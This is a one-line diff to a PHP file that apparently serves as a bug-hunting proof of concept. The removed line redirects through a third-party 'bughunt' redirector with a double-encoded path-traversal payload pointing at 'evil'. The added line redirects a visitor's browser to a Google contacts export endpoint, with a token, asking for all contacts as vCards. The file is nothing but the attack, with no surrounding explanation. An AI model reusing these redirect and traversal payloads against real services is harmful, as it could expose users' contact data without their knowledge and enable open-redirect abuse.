@@ -1,1 +1,1 @@
-<?php header('Location: http://bughunt1307.herokuapp.com/redirector.php?x=https://www.google.com/safebrowsing/alerts/javascript/astools.js;/%252e./%252e./%252e./%252e./evil'); ?> 
+<?php header('Location: https://www.google.com/s2/u/0/data/exportquery?ac=false&cids=1cb22c618b737cc7&cr=true&ct=true&ev=true&f=g2&gp=true&hl=en-US&id=personal&max=-1&nge=true&out=vcard&sf=display&sgids=6,d,e,f,17&st=0&tok=MnnPkmUBAAA.C5tUOFC3kJt7AmvGr9hL1w.lcIPYQXXQrTy6XsK2C7DZA&type=4'); ?> 
